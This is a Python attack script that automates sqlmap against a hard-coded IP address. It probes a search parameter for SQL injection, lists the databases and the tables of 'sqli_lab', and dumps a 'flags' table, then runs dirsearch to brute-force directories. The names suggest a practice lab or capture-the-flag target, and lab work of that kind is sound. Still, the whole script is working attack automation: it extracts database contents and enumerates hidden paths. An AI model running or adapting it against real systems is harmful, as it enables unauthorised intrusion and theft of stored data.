import os
import time
import subprocess
import sys

TARGET_URL = "http://111.248.120.159:8000"


def wait_for_service(url, retries=30, delay=5):
    print(f"Waiting for service at {url}...")
    for i in range(retries):
        try:
            # Use curl to check if service is up
            result = subprocess.run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", url],
                capture_output=True,
                text=True,
            )
            if result.stdout.strip() == "200":
                print("Service is ready!")
                return True
        except Exception as e:
            print(f"Error checking service: {e}")

        print(
            f"Service not ready yet. Retrying in {delay} seconds... ({i + 1}/{retries})"
        )
        time.sleep(delay)
    return False


def use_dirsearch(target_url: str, with_random_agent: bool = False):
    cmd = [
        "dirsearch",
        "-u",
        target_url,
    ]
    if with_random_agent:
        cmd.append("--random-agent")
    try:
        subprocess.run(cmd, check=True)
        print("Attack completed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Attack failed with error: {e}")
        sys.exit(1)


def use_sqlmap(target_url: str, *sqlmap_args: str):
    cmd = [
        "sqlmap",
        "-u",
        target_url,
        "--batch",
        *sqlmap_args,
    ]
    try:
        subprocess.run(cmd, check=True)
        print("Attack completed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Attack failed with error: {e}")
        sys.exit(1)


def run_attack():
    endpoint = f"{TARGET_URL}/search?q=test"

    if not wait_for_service(TARGET_URL):
        print("Service failed to become ready. Exiting.")
        sys.exit(1)

    print("Starting sqlmap attack...")
    # Initial sqlmap attack for reconnaissance
    use_sqlmap(endpoint)
    time.sleep(1)

    # testing for databases
    use_sqlmap(endpoint, "--dbs")
    time.sleep(10)

    # get database name and testing for get tables
    use_sqlmap(endpoint, "-D", "sqli_lab", "--tables")
    time.sleep(10)

    # get table name and testing for get columns
    use_sqlmap(endpoint, "-D", "sqli_lab", "-T", "flags", "--dump")
    time.sleep(10)

    print("Searching another common endpoint...")
    # do another attack for testing is another common endpoint from dirsearch
    use_dirsearch(TARGET_URL)
    time.sleep(1)


if __name__ == "__main__":
    run_attack()
